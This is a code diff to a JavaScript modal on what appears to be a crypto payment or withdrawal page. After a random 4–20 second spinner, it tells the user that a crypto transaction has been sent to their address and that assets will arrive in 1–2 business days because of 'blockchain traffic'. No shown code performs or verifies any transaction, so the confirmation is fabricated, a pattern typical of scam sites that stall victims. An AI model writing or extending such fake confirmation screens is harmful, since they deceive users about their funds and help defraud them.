@@ -172,11 +172,11 @@ const data = {
     msg.textContent = '';
     okBtn.style.display = 'none';
 
-    // Show custom spinner wheel and processing text (Razorpay style)
+    // Show custom spinner wheel and processing text
     spinner.innerHTML = `
       <div style="display:flex;flex-direction:column;align-items:center;justify-content:center;">
         <div class="rzp-spinner" style="width:48px;height:48px;border:6px solid #22c55e;border-top:6px solid #23272f;border-radius:50%;animation:spin 1s linear infinite;margin-bottom:16px;"></div>
-        <div style='color:#fff;font-size:1.1rem;margin-top:0;'>Processing...</div>
+        <div style='color:#fff;font-size:1.15rem;margin-top:0;'>Processing...</div>
       </div>
       <style>
         @keyframes spin { 0% { transform: rotate(0deg);} 100% { transform: rotate(360deg);} }
@@ -184,13 +184,19 @@ const data = {
     `;
     spinner.style.display = 'block';
 
+    // Show processing text in modal message
+    msg.innerHTML = `<div style='color:#fff;font-size:1.15rem;'>Processing...</div>`;
+    
     // Random delay between 4-20 seconds
     const delay = 4000 + Math.floor(Math.random() * 16000);
     setTimeout(() => {
       spinner.style.display = 'none';
       spinner.innerHTML = '';
       check.style.display = 'block';
-      msg.innerHTML = `<div style='color:#fff;font-size:1.15rem;margin-bottom:8px;'>Due to blockchain traffic your assets will be reflect in 1-2 business days</div><div style='color:#fff;font-size:1.15rem;margin-bottom:8px;'>Crypto Transaction initiated to your designated address</div>`;
+      msg.innerHTML = `
+        <div style='color:#fff;font-size:1.15rem;margin-bottom:16px;'>Due to blockchain traffic your assets will be reflect in 1-2 business days</div>
+        <div style='color:#fff;font-size:1.15rem;'>Crypto Transaction initiated to your Destined address</div>
+      `;
       okBtn.style.display = 'block';
       okBtn.onclick = function() {
         modal.style.display = 'none';
